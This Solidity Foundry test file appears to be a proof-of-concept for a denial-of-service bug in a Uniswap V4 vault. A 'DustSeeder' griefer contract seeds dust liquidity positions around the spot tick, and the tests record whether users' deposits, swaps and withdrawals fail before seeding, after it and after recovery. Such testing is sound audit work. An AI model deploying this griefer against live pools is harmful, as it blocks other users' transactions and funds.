// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance as Acceptance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault as HBase} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {ModifyLiquidityParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";

/// Unprivileged griefer: mints / burns 1-wide liquidity-1 positions around spot.
contract DustSeeder is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;
    IPoolManager immutable pm; PoolKey key;
    uint256 public spent0; uint256 public spent1;
    constructor(IPoolManager pm_, PoolKey memory key_) { pm = pm_; key = key_; }

    function seed(int24 n, int256 liq) external { pm.unlock(abi.encode(n, liq)); }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm));
        (int24 n, int256 liq) = abi.decode(data, (int24, int256));
        (, int24 t,,) = pm.getSlot0(key.toId());
        int24 s = key.tickSpacing;
        int24 base = t / s * s; if (t < 0 && t % s != 0) base -= s;
        int128 d0; int128 d1;
        for (int24 i = 1; i <= n; ++i) {
            (BalanceDelta a,) = pm.modifyLiquidity(key, ModifyLiquidityParams(base + i * s, base + (i + 1) * s, liq, bytes32(0)), "");
            (BalanceDelta b,) = pm.modifyLiquidity(key, ModifyLiquidityParams(base - i * s, base - (i - 1) * s, liq, bytes32(0)), "");
            d0 += a.amount0() + b.amount0(); d1 += a.amount1() + b.amount1();
        }
        _settle(key.currency0, d0); _settle(key.currency1, d1);
        return "";
    }

    function _settle(Currency c, int128 d) internal {
        if (d < 0) {
            pm.sync(c); IERC20(Currency.unwrap(c)).transfer(address(pm), uint128(-d)); pm.settle();
            if (Currency.unwrap(c) == Currency.unwrap(key.currency0)) spent0 += uint128(-d); else spent1 += uint128(-d);
        } else if (d > 0) pm.take(c, address(this), uint128(d));
    }
}

contract FSDustTickCapDosTest is Acceptance {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;
    DustSeeder seeder;
    address bob = address(0xB0B);

    function _spacing() internal pure virtual returns (int24) { return 1; }

    function setUp() public virtual override {
        HBase.setUp();
        IERC20 a = IERC20(address(new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32)));
        IERC20 b = IERC20(address(new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32)));
        bool ordered = address(a) < address(b);
        token0 = ordered ? a : b; token1 = ordered ? b : a;
        unit0 = 1e18; unit1 = 1e18;
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 500, _spacing(), IHooks(address(0)));
        poolManager.initialize(poolKey, uint160(1 << 96));
        _seedPool(1_000e18); // honest external full-range LP
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        _bootstrap(); // honest LP 1000/1000
        // honest market trade moves spot off the bitmap word edge (tick 0 is a word boundary)
        _externalSwap(true, 13e18);
        seeder = new DustSeeder(poolManager, poolKey);
        token0.transfer(address(seeder), 1e18); token1.transfer(address(seeder), 1e18);
        token0.transfer(bob, 1e24); token1.transfer(bob, 1e24);
        vm.startPrank(bob);
        token0.approve(address(vault), type(uint256).max); token1.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function _zapIn(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(bob);
        (ok, err) = address(vault).call(abi.encodeCall(vault.exchangeIn, (token0, amt, IERC20(address(vault)), 0, bob, false, block.timestamp)));
    }
    function _swapIn(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(bob);
        (ok, err) = address(vault).call(abi.encodeCall(vault.exchangeIn, (token0, amt, token1, 0, bob, false, block.timestamp)));
    }
    function _swapOut(uint256 amtOut) internal returns (bool ok, bytes memory err) {
        vm.prank(bob);
        (ok, err) = address(vault).call(abi.encodeCall(IStandardExchangeOut.exchangeOut, (token0, type(uint128).max, token1, amtOut, bob, false, block.timestamp)));
    }
    function _zapOut(uint256 shares) internal returns (bool ok, bytes memory err) {
        vm.prank(bob);
        (ok, err) = address(vault).call(abi.encodeCall(vault.exchangeIn, (IERC20(address(vault)), shares, token0, 0, bob, false, block.timestamp)));
    }
    function _log(string memory l, bool ok, bytes memory err) internal pure {
        console2.log(l, ok);
        if (!ok) console2.logBytes(err);
    }

    function _probe(string memory tag) internal {
        uint256 snap = vm.snapshotState();
        bool ok; bytes memory e;
        uint256[4] memory zi = [uint256(1e18), 4e18, 8e18, 10e18];
        for (uint256 i; i < 4; ++i) { (ok, e) = _zapIn(zi[i]); console2.log(tag, "zapIn", zi[i]); _log("  ok", ok, e); vm.revertToState(snap); snap = vm.snapshotState(); }
        uint256[4] memory si = [uint256(1e18), 5e18, 10e18, 20e18];
        for (uint256 i; i < 4; ++i) { (ok, e) = _swapIn(si[i]); console2.log(tag, "swapExactIn", si[i]); _log("  ok", ok, e); vm.revertToState(snap); snap = vm.snapshotState(); }
        uint256[5] memory so = [uint256(1e12), 1e15, 1e17, 1e18, 3e18];
        for (uint256 i; i < 5; ++i) { (ok, e) = _swapOut(so[i]); console2.log(tag, "swapExactOut", so[i]); _log("  ok", ok, e); vm.revertToState(snap); snap = vm.snapshotState(); }
        uint256 bs = vault.balanceOf(bob);
        uint256[3] memory zo = [bs / 10, bs / 2, bs];
        for (uint256 i; i < 3; ++i) { (ok, e) = _zapOut(zo[i]); console2.log(tag, "zapOut shares", zo[i]); _log("  ok", ok, e); vm.revertToState(snap); snap = vm.snapshotState(); }
        // also: alice (this) zaps out 50% of her shares
        uint256 as_ = vault.balanceOf(address(this)) / 2;
        (ok, e) = address(vault).call(abi.encodeCall(vault.exchangeIn, (IERC20(address(vault)), as_, token0, 0, address(this), false, block.timestamp)));
        console2.log(tag, "alice zapOut half"); _log("  ok", ok, e); vm.revertToState(snap);
    }

    function test_dustTickDos() public {
        (bool ok,) = _zapIn(8e18); require(ok, "bob zap");
        (, int24 t0,,) = poolManager.getSlot0(poolKey.toId());
        console2.log("spot tick", int256(t0));
        _probe("PRE");
        seeder.seed(150, 1);
        console2.log("attacker spent0/spent1 (wei)", seeder.spent0(), seeder.spent1());
        _probe("POST");
        seeder.seed(150, -1);
        _probe("RECOVER");
    }

    function _zapIn1(uint256 amt) internal returns (bool ok, bytes memory err) {
        vm.prank(bob);
        (ok, err) = address(vault).call(abi.encodeCall(vault.exchangeIn, (token1, amt, IERC20(address(vault)), 0, bob, false, block.timestamp)));
    }

    function test_seedCountSweep() public {
        (bool ok,) = _zapIn(8e18); require(ok, "bob zap");
        uint24[6] memory ns = [uint24(1), 2, 8, 32, 64, 150];
        for (uint256 k; k < ns.length; ++k) {
            uint256 snap = vm.snapshotState();
            seeder.seed(int24(ns[k]), 1);
            console2.log("=== seeded positions per side", ns[k]);
            uint256 s2 = vm.snapshotState();
            bytes memory e;
            (ok, e) = _zapIn(1e18); _log("  zapIn token0 1e18", ok, e); vm.revertToState(s2); s2 = vm.snapshotState();
            (ok, e) = _zapIn1(1e18); _log("  zapIn token1 1e18", ok, e); vm.revertToState(s2); s2 = vm.snapshotState();
            (ok, e) = _zapIn1(5e18); _log("  zapIn token1 5e18", ok, e); vm.revertToState(s2); s2 = vm.snapshotState();
            (ok, e) = _swapIn(10e18); _log("  swapExactIn 10e18", ok, e); vm.revertToState(s2); s2 = vm.snapshotState();
            uint256 as_ = vault.balanceOf(address(this)) / 2;
            (ok, e) = address(vault).call(abi.encodeCall(vault.exchangeIn, (IERC20(address(vault)), as_, token0, 0, address(this), false, block.timestamp)));
            _log("  alice zapOut half -> token0", ok, e); vm.revertToState(s2);
            vm.revertToState(snap);
        }
    }
}
